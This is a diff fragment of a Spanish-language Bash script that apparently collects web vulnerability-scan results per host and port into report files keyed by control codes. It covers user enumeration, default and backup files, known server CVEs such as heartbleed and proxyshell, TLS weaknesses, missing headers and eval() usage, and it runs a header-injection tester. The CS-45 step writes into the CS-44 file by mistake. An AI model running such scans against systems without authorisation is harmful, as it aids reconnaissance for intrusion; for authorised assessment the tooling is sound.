+		grep -ira 'vulnerabilidad=ExposicionUsuarios' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port"_CS-41.txt		
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | grep _wpUsers ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Usuarios:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-41.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-41.txt logs/vulnerabilidades/"$host"_"$port"_CS-41.txt 2>/dev/null
+
+		# CS-42 Respuesta HTTP
+		checkHeadersServer -url=$proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_CS-42.txt
+		grep -i 'Vulnerable'  logs/vulnerabilidades/"$host"_"$port"_CS-42.txt > .vulnerabilidades/"$host"_"$port"_CS-42.txt
+		
+		#CS-44 Servidores
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosPeligrosos|_backupweb' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  > .vulnerabilidades/"$host"_"$port"_CS-44.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-44.txt logs/vulnerabilidades/"$host"_"$port"_CS-44.txt 2>/dev/null
+
+		# CS-45 Protocolos antiguos
+		cat .vulnerabilidades2/"$host"_"$port"_vulTLS.txt > .vulnerabilidades/"$host"_"$port"_CS-44.txt
+		cat .vulnerabilidades2/"$host"_"$port"_confTLS.txt >> .vulnerabilidades/"$host"_"$port"_CS-44.txt
+
+
+		#CS-46 Archivos por defecto
+		grep -ira 'vulnerabilidad=contenidoPrueba' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port"_CS-46.txt
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_archivosDefecto|_passwordDefecto' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done  >> .vulnerabilidades/"$host"_"$port"_CS-46.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-46.txt logs/vulnerabilidades/"$host"_"$port"_CS-46.txt 2>/dev/null
+
+		#CS-48 Servidor mal configurado
+		grep -ira 'vulnerabilidad=ListadoDirectorios' logs | awk {'print $2'} > .vulnerabilidades/"$host"_"$port"_CS-48.txt
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_heartbleed|_tomcatNuclei|_apacheNuclei|_IIS~CVE~2017~7269|_citrixVul|_apacheStruts|_shortname|_apacheTraversal' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad server:$_\n"' >> .vulnerabilidades/"$host"_"$port"_CS-48.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-48.txt logs/vulnerabilidades/"$host"_"$port"_CS-48.txt 2>/dev/null
+
+		# CS-49  Cache-Control
+		grep -i 'Cache-Control' .vulnerabilidades2/"$host"_"$port"_CS-49.txt >> .vulnerabilidades/"$host"_"$port"_CS-49.txt 2>/dev/null
+
+
+
+		# CS-51 Header seguros
+		grep -i 'X-Content-Type-Options' .vulnerabilidades2/"$host"_"$port"_CS-49.txt > .vulnerabilidades/"$host"_"$port"_CS-51-1.txt 2>/dev/null
+		grep -i 'Strict-Transport-Security' .vulnerabilidades2/"$host"_"$port"_CS-49.txt >> .vulnerabilidades/"$host"_"$port"_CS-51-2.txt 2>/dev/null
+		grep -i 'Referrer-Policy' .vulnerabilidades2/"$host"_"$port"_CS-49.txt >> .vulnerabilidades/"$host"_"$port"_CS-51-3.txt 2>/dev/null
+		grep -i 'X-Frame-Options' .vulnerabilidades2/"$host"_"$port"_CS-49.txt >> .vulnerabilidades/"$host"_"$port"_CS-51-4.txt 2>/dev/null
+
+
+		#CS-63 Software obsoleto
+		egrep -ira "\.class\"|\.class\'|\.class |\.nmf\"|\.nmf\'|\.nmf |\.xap\"|\.xap\'|\.xap |\.swf\"|\.swf\'|\.swf |x-nacl|<object|application\/x-silverlight" webclone/"$host"_"$port"/ > .vulnerabilidades/"$host"_"$port"_CS-63.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-63.txt logs/vulnerabilidades/"$host"_"$port"_CS-63.txt 2>/dev/null
+
+		#CS-56 Funciones peligrosas
+		egrep -ira " eval\(" webclone/"$host"_"$port"/ > .vulnerabilidades/"$host"_"$port"_CS-56.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-56.txt logs/vulnerabilidades/"$host"_"$port"_CS-56.txt 2>/dev/null
+
+		# CS-62 HTTP header injection
+		 headi -u $proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_CS-62.txt
+		 grep 'Vul' logs/vulnerabilidades/"$host"_"$port"_CS-62.txt > .vulnerabilidades/"$host"_"$port"_CS-62.txt
+
+		# CS-69 Vulnerabilidades conocidas
+		for file in $(ls .enumeracion2 .vulnerabilidades2 | egrep '_droopescan|_joomlaNuclei|_wordpressNuclei|_drupalNuclei|_redirectContent|_xml-rpc-habilitado|_wordpressPlugins|_wordpressCVE~2022~21661|_wordpressGhost|_proxynoshell|_proxyshell|_registroHabilitado|_sap-scan' ); do cat .vulnerabilidades2/$file .enumeracion2/$file 2>/dev/null ; done | perl -ne '$_ =~ s/\n//g; print "Vulnerabilidad app:$_\n"' > .vulnerabilidades/"$host"_"$port"_CS-69.txt
+		cp .vulnerabilidades/"$host"_"$port"_CS-69.txt logs/vulnerabilidades/"$host"_"$port"_CS-69.txt 2>/dev/null
+	done
+done	
 
 insert_data	
 # delete empty files
